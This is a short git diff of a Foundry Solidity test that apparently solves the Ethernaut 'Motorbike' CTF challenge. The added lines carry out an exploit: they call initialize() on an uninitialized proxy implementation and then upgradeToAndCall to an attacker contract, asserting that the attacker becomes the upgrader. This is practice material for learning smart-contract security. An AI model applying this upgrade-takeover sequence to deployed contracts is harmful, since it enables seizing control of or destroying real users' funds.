@@ -29,10 +29,13 @@ contract MotorbikeTest is Test, DeployMotorbikeScript {
     function test_isSolved() public {
         vm.startPrank(attacker);
 
-
+        engine.initialize();        
         motorbikeAttacker = new MotorbikeAttacker();
-        // assertEq( address(reentranceChallenge).balance, 0 ether);
-        // assertEq( address(reentranceAttacker).balance, 10.2 ether);
+
+        bytes memory initEncoded = abi.encodeWithSignature("initialize()");
+        engine.upgradeToAndCall(address(motorbikeAttacker), initEncoded);
+
+        assertEq(engine.upgrader(), address(attacker));
 
 
         vm.stopPrank(  );
